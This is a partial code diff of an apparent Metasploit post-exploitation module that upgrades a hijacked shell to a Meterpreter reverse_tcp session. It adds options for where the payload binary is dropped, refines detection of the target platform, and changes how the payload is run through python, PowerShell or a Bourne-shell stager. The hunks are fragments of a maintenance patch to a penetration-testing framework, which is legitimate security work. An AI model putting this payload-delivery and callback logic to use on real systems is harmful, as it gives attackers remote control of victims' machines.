@@ -8,7 +8,7 @@ require 'rex'
 require 'msf/core/exploit/powershell'
 require 'msf/core/post/windows/powershell'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Exploit::Powershell
   include Post::Windows::Powershell
 
@@ -41,7 +41,11 @@ class Metasploit3 < Msf::Post
       OptEnum.new('WIN_TRANSFER',
         [true, 'Which method to try first to transfer files on a Windows target.', 'POWERSHELL', ['POWERSHELL', 'VBS']]),
       OptString.new('PAYLOAD_OVERRIDE',
-        [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil])
+        [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil]),
+      OptString.new('BOURNE_PATH',
+        [false, 'Remote path to drop binary']),
+      OptString.new('BOURNE_FILE',
+        [false, 'Remote filename to use for dropped binary'])
     ], self.class)
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
@@ -63,6 +67,10 @@ class Metasploit3 < Msf::Post
       lhost = framework.datastore['LHOST']
     else
       lhost = session.tunnel_local.split(':')[0]
+      if lhost == 'Local Pipe'
+        print_error 'LHOST is "Local Pipe", please manually set the correct IP.'
+        return
+      end
     end
 
     # If nothing else works...
@@ -72,24 +80,24 @@ class Metasploit3 < Msf::Post
 
     # Handle platform specific variables and settings
     case session.platform
-    when /win/i
-      platform = 'win'
+    when 'windows'
+      platform = 'windows'
       payload_name = 'windows/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
       larch = [ARCH_X86]
       psh_arch = 'x86'
       vprint_status("Platform: Windows")
-    when /osx/i
+    when 'osx'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
       vprint_status("Platform: OS X")
-    when /solaris/i
+    when 'solaris'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
       vprint_status("Platform: Solaris")
     else
       # Find the best fit, be specific with uname to avoid matching hostname or something else
-      target_info = cmd_exec('uname -mo')
+      target_info = cmd_exec('uname -ms')
       if target_info =~ /linux/i && target_info =~ /86/
         # Handle linux shells that were identified as 'unix'
         platform = 'linux'
@@ -97,18 +105,22 @@ class Metasploit3 < Msf::Post
         lplat = [Msf::Platform::Linux]
         larch = [ARCH_X86]
         vprint_status("Platform: Linux")
-      elsif cmd_exec('python -V') =~ /Python (2|3)\.(\d)/
+      elsif target_info =~ /darwin/i
+        platform = 'python'
+        payload_name = 'python/meterpreter/reverse_tcp'
+        vprint_status("Platform: OS X")
+      elsif cmd_exec('python -V 2>&1') =~ /Python (2|3)\.(\d)/
         # Generic fallback for OSX, Solaris, Linux/ARM
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
         vprint_status("Platform: Python [fallback]")
       end
     end
-    payload_name = datastore['PAYLOAD_OVERWRITE'] if datastore['PAYLOAD_OVERWRITE']
+    payload_name = datastore['PAYLOAD_OVERRIDE'] if datastore['PAYLOAD_OVERRIDE']
     vprint_status("Upgrade payload: #{payload_name}")
 
     if platform.blank?
-      print_error("Shells on the the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.")
+      print_error("Shells on the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.")
       return nil
     end
 
@@ -127,9 +139,9 @@ class Metasploit3 < Msf::Post
     end
 
     case platform
-    when 'win'
+    when 'windows'
       if session.type == 'powershell'
-        template_path = File.join(Msf::Config.data_directory, 'templates', 'scripts')
+        template_path = Rex::Powershell::Templates::TEMPLATE_DIR
         psh_payload = case datastore['Powershell::method']
                       when 'net'
                         Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload_data)
@@ -162,7 +174,7 @@ class Metasploit3 < Msf::Post
       end
     when 'python'
       vprint_status("Transfer method: Python")
-      cmd_exec("python -c \"#{payload_data}\"")
+      cmd_exec("echo \"#{payload_data}\" | python")
     else
       vprint_status("Transfer method: Bourne shell [fallback]")
       exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
@@ -188,11 +200,13 @@ class Metasploit3 < Msf::Post
       :linemax => linemax,
       #:nodelete => true # keep temp files (for debugging)
     }
-    if session.platform =~ /win/i
-      opts[:decoder] = File.join(Msf::Config.data_directory, 'exploits', 'cmdstager', 'vbs_b64')
+    if session.platform == 'windows'
+      opts[:decoder] = File.join(Rex::Exploitation::DATA_DIR, "exploits", "cmdstager", 'vbs_b64')
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
     else
       opts[:background] = true
+      opts[:temp] = datastore['BOURNE_PATH']
+      opts[:file] = datastore['BOURNE_FILE']
       cmdstager = Rex::Exploitation::CmdStagerBourne.new(exe)
       # Note: if a OS X binary payload is added in the future, use CmdStagerPrintf
       #       as /bin/sh on OS X doesn't support the -n option on echo
